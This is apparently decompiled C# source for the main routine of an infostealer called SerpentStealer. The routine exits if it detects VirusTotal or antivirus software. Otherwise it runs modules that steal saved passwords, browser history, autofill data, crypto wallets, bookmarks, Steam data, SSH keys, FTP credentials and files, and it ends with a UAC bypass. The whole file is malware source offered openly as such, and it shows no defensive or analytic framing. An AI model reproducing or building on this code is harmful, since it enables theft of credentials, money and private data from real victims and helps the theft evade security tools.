using System;
using System.Runtime.CompilerServices;
using System.Threading;
using Evasion;
using Modules;

namespace SerpentStealer
{
	// Token: 0x0200000B RID: 11
	internal class Program
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002DB8 File Offset: 0x00000FB8
		[global::System.Runtime.CompilerServices.NullableContext(1)]
		private static void Main(string[] A_0)
		{
			if (AntiVT.IsVirusTotal())
			{
				Thread.Sleep(60000);
				Environment.Exit(0);
			}
			if (AntiAv.IsAvPresent())
			{
				Thread.Sleep(60000);
				Environment.Exit(0);
			}
			Embed embed = new Embed();
			PasswordStealer passwordStealer = new PasswordStealer();
			HistoryStealer historyStealer = new HistoryStealer();
			AutofillStealer autofillStealer = new AutofillStealer();
			Wallets wallets = new Wallets();
			BookmarkStealer bookmarkStealer = new BookmarkStealer();
			SteamClient steamClient = new SteamClient();
			SSHStealer sshstealer = new SSHStealer();
			FTPStealer ftpstealer = new FTPStealer();
			FileStealer fileStealer = new FileStealer();
			autofillStealer.Run();
			historyStealer.Run();
			embed.Run();
			passwordStealer.Run();
			wallets.Run();
			bookmarkStealer.Run();
			steamClient.GetSteam("C:\\Users\\Aperx\\Desktop").Wait();
			sshstealer.Run();
			ftpstealer.Run();
			fileStealer.Run();
			UAC.Bypass("cmd.exe");
			Console.WriteLine("[+] Program finished.");
		}
	}
}
